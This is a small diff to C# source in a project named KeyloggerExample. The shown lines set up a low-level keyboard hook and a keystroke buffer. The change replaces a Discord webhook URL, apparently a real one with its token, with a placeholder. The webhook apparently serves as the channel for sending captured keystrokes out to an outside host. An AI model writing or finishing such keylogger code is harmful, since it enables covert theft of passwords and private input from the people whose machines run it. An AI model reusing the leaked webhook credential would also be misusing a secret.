@@ -26,7 +26,7 @@ namespace KeyloggerExample
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static StringBuilder _keyBuffer = new StringBuilder();
-        private static readonly string webhookUrl = "https://discord.com/api/webhooks/1301359953885532162/OjqOTz3TAfkzswMWkK-_C9TmMdHe05H6DHu0-H0BPooZTsAzNxF_Qk0hAm_3vm-ltlT0";
+        private static readonly string webhookUrl = "DISCORD WEBHOOK URL";
 
         static async Task Main(string[] args)
         {
